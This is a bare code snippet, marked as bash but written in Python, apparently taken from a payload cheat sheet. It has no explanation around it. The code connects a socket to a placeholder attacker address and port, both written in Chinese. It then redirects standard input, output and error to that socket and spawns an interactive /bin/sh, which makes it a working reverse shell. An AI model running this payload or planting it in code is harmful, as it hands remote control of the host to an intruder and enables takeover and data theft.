```bash
import os,pty,socket
s=socket.socket()
s.connect(("攻击者ip",端口))
[os.dup2(s.fileno(),f) for f in (0,1,2)]
pty.spawn("/bin/sh")
```
